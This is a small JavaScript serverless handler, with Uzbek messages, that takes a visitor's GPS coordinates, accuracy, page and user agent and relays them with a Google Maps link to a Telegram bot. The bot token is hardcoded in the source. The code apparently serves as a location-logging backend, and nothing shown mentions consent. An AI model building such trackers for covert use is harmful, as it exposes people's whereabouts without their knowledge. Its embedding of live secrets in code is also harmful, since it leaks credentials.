export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.status(405).json({ ok: false, error: "Only POST requests are allowed." });
    return;
  }

  try {
    const BOT_TOKEN = "8938947614:AAEgbgugugi6XenUmZfQWwEE_LHgyzXEQZM";
    const CHAT_ID = "5399168630";

    const { latitude, longitude, accuracy, page, userAgent, time } = req.body;

    const text = `
📍 Yangi joylashuv yuborildi

Latitude: ${latitude}
Longitude: ${longitude}
Aniqlik: ${Math.round(accuracy)} metr

🗺 Google Maps:
https://maps.google.com/?q=${latitude},${longitude}

🌐 Sahifa: ${page}
📱 Qurilma: ${userAgent}
⏰ Vaqt: ${time}
`;

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      }
    );

    const telegramData = await telegramResponse.json();

    if (!telegramResponse.ok) {
      console.error("Telegram API error:", telegramData);
      throw new Error(telegramData.description || telegramResponse.statusText);
    }

    res.status(200).json({ ok: true, telegramData });
  } catch (error) {
    console.error(error);
    res.status(500).json({ ok: false, error: error.message });
  }
}
